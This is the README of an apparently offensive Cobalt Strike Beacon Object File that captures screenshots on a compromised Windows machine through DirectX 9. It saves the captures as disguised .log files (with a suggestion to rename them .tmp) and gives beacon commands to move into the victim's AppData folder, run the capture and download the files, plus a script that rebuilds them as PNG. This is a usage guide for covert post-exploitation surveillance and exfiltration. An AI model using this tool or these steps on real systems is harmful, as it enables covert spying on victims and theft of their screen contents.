# DirectX9-Screenshot-BOF
![memez](/img/8gku6o.jpg)
## Overview

Capture Screenshots with DirectX 9   
TBH I haven't tested this too much just seemed like a cool idea

## Notes

- Export screenshots to the **current working directory** as `.log` files
- Output format: `<width>oo<height>.log`
- Reconstruct `.log` files into PNG format locally
- Libraries Used - MSVCRT, D3D9

- Just swap the output file to .tmp in SavePixelsToLogFile and recompile if preferred 

### BOF Execution

Ensure you are in the directory you would like the screenshot exported as. 
```
beacon> cd C:\Users\Victim\AppData\
beacon> screenshot-dx
beacon> download <filename>
```

### Example

![Cobalt Strike Example](/img/cobalt-test.png)

![AutoDownload Example](/img/auto-download.png)
## Image Reconstruction

To reconstruct the image with this script, follow these steps:

1. Install the required packages:
    ```bash
    pip3 install Pillow
    ```

2. Run the script with the desired log file path and output file path:
    ```bash
    python3 assemble.py <logfile> output.png
    ```

### Contributers
Big thanks to ma boy Kyle started this
@kyle41111
